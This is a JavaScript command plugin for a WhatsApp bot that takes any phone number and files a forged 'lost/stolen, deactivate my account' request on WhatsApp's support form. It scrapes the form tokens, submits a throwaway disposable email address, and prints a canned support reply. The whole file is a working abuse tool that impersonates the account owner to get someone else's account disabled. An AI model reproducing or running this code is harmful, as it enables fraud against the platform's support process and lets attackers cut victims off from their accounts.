import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '*[β] πΈπ½πΆππ΄ππ΄ π΄π» π½ππΌπ΄ππΎ πππ΄ π³π΄ππ΄π΄ π³π΄ππ°π²ππΈππ°π π΄π½ π΅πΎππΌπ°ππΎ πΈπ½ππ΄ππ½π°π²πΈπΎπ½π°π», π΄πΉπ΄πΌπΏπ»πΎ: +π· (πΊπ»0) 555-555*'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta estΓ‘ deshabilitada temporalmente y se eliminarΓ‘ automΓ‘ticamente en 30 dΓ­as si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atenciΓ³n al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el perΓ­odo de cierre:\n β’ Es posible que sus contactos en WhatsApp aΓΊn vean su nombre y foto de perfil.\n β’ Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerΓ‘ en estado pendiente por hasta 30 dΓ­as.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el cΓ³digo de 6 dΓ­gitos, el cΓ³digo que recibe por SMS o llamada telefΓ³nica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este nΓΊmero de telΓ©fono te pertenece. Por favor, envΓ­anos documentaciΓ³n que nos permita verificar que el nΓΊmero es de tu propiedad, como una copia de la factura telefΓ³nica o el contrato de servicio.\n\nPor favor, asegΓΊrate de ingresar tu nΓΊmero de telΓ©fono en formato internacional completo. Para obtener mΓ‘s informaciΓ³n sobre el formato internacional, consulta este artΓ­culo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true
export default handler
